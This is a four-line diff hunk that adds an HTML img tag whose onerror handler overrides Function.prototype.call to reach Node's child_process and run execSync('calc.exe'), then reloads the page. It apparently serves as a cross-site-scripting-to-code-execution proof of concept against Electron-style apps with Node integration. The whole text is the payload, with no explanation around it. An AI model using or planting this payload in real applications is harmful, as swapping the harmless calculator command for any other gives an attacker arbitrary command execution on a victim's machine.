@@ -1,0 +1,4 @@
+<img src onerror="Function.prototype.call=function(process){
+process.mainModule.require('child_process').execSync('calc.exe');
+}
+location.reload();">
